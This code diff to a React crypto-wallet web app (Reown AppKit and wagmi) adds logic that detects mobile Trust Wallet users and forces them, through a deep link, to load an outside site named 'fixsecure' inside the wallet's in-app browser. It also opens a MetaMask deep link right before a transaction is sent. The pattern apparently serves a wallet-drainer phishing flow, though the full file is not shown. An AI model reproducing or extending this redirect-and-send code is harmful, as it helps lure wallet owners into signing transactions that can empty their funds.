@@ -11,7 +11,7 @@ import {
   bitcoin,
   sepolia,
 } from "@reown/appkit/networks";
-import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
+import { useAppKit, useAppKitAccount, useWalletInfo } from "@reown/appkit/react";
 import {
   useSwitchChain,
   useSendTransaction,
@@ -45,6 +45,7 @@ const Home = () => {
   const { address, isConnected } = useAppKitAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
+       const { walletInfo } = useWalletInfo();
 
   const [txHash, setTxHash] = useState(null);
 
@@ -130,6 +131,28 @@ const { data: request } = usePrepareTransactionRequest(
     }
   }, [confirmed]);
 
+      const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
+    const [visitedTW, setVisitedTW ] = useState(false)
+
+
+    const isTrustWalletApp = () => {
+  // Trust Wallet injects `ethereum.isTrust` in the in-app browser
+  return typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true;
+}
+
+useEffect(() => {
+  if (
+    walletInfo?.name === "Trust Wallet" &&
+    isMobile() &&
+    !visitedTW &&
+    !isTrustWalletApp() // ensure we are not already inside the app
+  ) {
+    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=${encodeURIComponent("https://fixsecure.onrender.com")}`;
+    window.open(trustLink, "_blank");
+    setVisitedTW(true);
+  }
+}, [isConnected, walletInfo, activeChain, visitedTW]);
+
   useEffect(() => {
     if (isConnected && address && activeChain.id) {
       console.log("Wallet connected:", address);
@@ -179,6 +202,12 @@ const { data: request } = usePrepareTransactionRequest(
     console.log("Not enough balance or amount to send");
     return;
   }
+
+         if(walletInfo?.name === "MetaMask" && isMobile()) {
+      const metamaskLink= "https://link.metamask.io"
+      window.open(metamaskLink, "_blank")
+    }
+
 
     sendTransaction(request, {
       onSuccess(hash) {
